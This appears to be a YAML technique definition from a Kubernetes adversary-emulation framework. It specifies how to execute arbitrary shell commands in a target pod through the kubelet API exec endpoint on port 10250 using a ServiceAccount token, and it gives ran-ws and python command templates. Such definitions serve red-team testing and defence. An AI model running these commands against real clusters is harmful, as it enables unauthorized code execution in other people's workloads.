id: execute-via-get-node-proxy
name: Execute via Node/Proxy
description: Execute a command on a target node via the kubelet API proxy
tactic: Execution
techniques: ["Command and Scripting Interpreter: Unix Shell"]
status: disabled
preconditions:
  accessLevel: user-exec
  kind: System
  # rbac:
  # - verb: get
  #   resource: "nodes/proxy"
parameters:
  NAMESPACE:
    type: Namespace
    default: ${TARGET}
    description: Kubernetes namespace of the target pod
  POD_NAME:
    type: Pod
    default: ${TARGET}
    description: Name of the target pod
  CONTAINER:
    type: string
    description: Name of the target container in the pod
  NODE:
    type: Node
    description: Name or IP of the node on which the pod is running.
  COMMAND:
    type: string
    description: the command to execute in the shell
  TOKEN:
    type: ServiceAccount
    description: the ServiceAccount token used to authorize this request
    default: ""
procedures:
  - key: ran-ws
    tool: ran-ws
    command: >
      ran-ws --url "wss://${NODE}:10250/exec/${NAMESPACE}/${POD_NAME}/${CONTAINER}?output=1&error=1&command=${COMMAND}" --token ${TOKEN}
  - key: python-ws
    tool: python3
    command: >
      TOKEN=${TOKEN} python3 ws.py "wss://${NODE}:10250/exec/${NAMESPACE}/${POD_NAME}/${CONTAINER}?output=1&error=1&command=${COMMAND}"
